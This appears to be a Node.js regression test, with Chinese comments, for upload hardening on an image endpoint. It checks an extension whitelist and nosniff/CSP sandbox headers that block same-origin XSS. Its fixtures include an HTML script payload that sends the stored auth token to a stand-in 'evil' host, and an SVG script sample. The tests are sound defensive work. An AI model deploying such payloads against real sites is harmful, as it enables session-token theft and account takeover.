/**
 * 上传加固（2026-09-11）。
 *
 * ## 为什么有这条
 *
 * `/api/images/upload` 收文件 → 落进 `DATA_DIR/uploads` → 由
 * `app.use("/uploads", express.static(...))` **同源、无鉴权**地提供出去。
 *
 * 而文件名原来是 `path.extname(originalname).replace(/[^.\w]/g, "")` —— 只过滤
 * 特殊字符，**不过滤类型**。于是 `.html` / `.svg` 都能活着落盘，浏览器按
 * `text/html` 打开它，里面的脚本就能读走 `localStorage['nox-auth-token']`。
 * 一次上传 = 全系统接管（含那条真的会下单的 confirm 端点）。
 *
 * 现在两道防线：扩展名白名单 + 响应头 nosniff / CSP sandbox。
 * 这条测试同时钉住两者 —— 任何一道被拆掉都会红。
 */
import assert from "node:assert/strict";
import test from "node:test";

import { api, startBridge, TOKEN } from "./helpers.js";

let bridge;
const base = () => bridge.base;

test.before(async () => {
  bridge = await startBridge();
});
test.after(async () => {
  await bridge?.stop();
});

/** multipart 上传一个"文件"。api() 只会发 JSON，所以这里手搓。 */
async function upload(name, bytes, type) {
  const fd = new FormData();
  fd.append("file", new Blob([bytes], { type }), name);
  const r = await fetch(`${base()}/api/images/upload`, {
    method: "POST",
    headers: { "X-Nox-Token": TOKEN },
    body: fd,
  });
  let data = null;
  try { data = await r.json(); } catch { /* 出错时可能不是 JSON */ }
  return { status: r.status, data };
}

test("传 .html 上去，落盘的绝不是 .html（扩展名白名单）", async () => {
  const evil = Buffer.from("<script>fetch('//evil/'+localStorage['nox-auth-token'])</script>");
  const { status, data } = await upload("evil.html", evil, "text/html");

  assert.equal(status, 200, `上传本身不该失败，实际 ${status}`);
  assert.ok(data?.url, "没拿到 url");
  assert.ok(
    !/\.html$/i.test(data.url),
    `🔴 落盘文件名还是 .html —— 同源 XSS 回来了：${data.url}`,
  );
  assert.ok(
    /\.(bin|jpg|jpeg|png|gif|webp|heic|heif|bmp|avif)$/i.test(data.url),
    `后缀不在白名单里，说明白名单被绕过了：${data.url}`,
  );
});

test("传 .svg 也一样（svg 当文档打开能执行脚本）", async () => {
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  const { status, data } = await upload("x.svg", svg, "image/svg+xml");
  assert.equal(status, 200);
  assert.ok(!/\.svg$/i.test(data.url), `🔴 .svg 活着落盘了：${data.url}`);
});

test("正常图片照旧（不要把功能修坏）", async () => {
  // 一个最小的合法 PNG（1x1 透明）
  const png = Buffer.from(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489" +
    "0000000a49444154789c6300010000050001a5f645400000000049454e44ae426082",
    "hex",
  );
  const { status, data } = await upload("photo.png", png, "image/png");
  assert.equal(status, 200);
  assert.match(data.url, /\.png$/i, `正常 png 被改坏了：${data.url}`);
});

test("/uploads 的响应带 nosniff + CSP sandbox", async () => {
  const png = Buffer.from(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489" +
    "0000000a49444154789c6300010000050001a5f645400000000049454e44ae426082",
    "hex",
  );
  const { data } = await upload("hdr.png", png, "image/png");
  const r = await fetch(`${base()}${data.url}`);

  assert.equal(r.status, 200, "上传的文件应该能取回来（图片要能内联显示）");
  assert.equal(
    r.headers.get("x-content-type-options"),
    "nosniff",
    "缺 nosniff —— 浏览器会嗅探 MIME",
  );
  const csp = r.headers.get("content-security-policy") || "";
  assert.match(csp, /sandbox/, `CSP 里没有 sandbox：${csp}`);
  // 不能加 attachment —— 那会让聊天里的图片变成下载
  assert.equal(r.headers.get("content-disposition"), null, "不该带 Content-Disposition");
});

test("/uploads 依然不需要 token（图片靠 <img src> 加载，这是有意的）", async () => {
  // 这条是"记录现状"而不是"要求加固"：
  // 意味着**一旦 URL 从别处漏出就永久可读**（30 天 immutable + 无吊销）。
  // 要不要改成签名 URL 是排期 0.8 的事，这里只把事实钉住，免得有人以为它有鉴权。
  const png = Buffer.from(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489" +
    "0000000a49444154789c6300010000050001a5f645400000000049454e44ae426082",
    "hex",
  );
  const { data } = await upload("open.png", png, "image/png");
  const r = await fetch(`${base()}${data.url}`); // 故意不带 token
  assert.equal(r.status, 200, "取图片不该要 token —— 变了的话说明 0.8 做完了，删掉这条");
  void api; // api() 在这条里用不上，留着 import 以便后续扩展
});
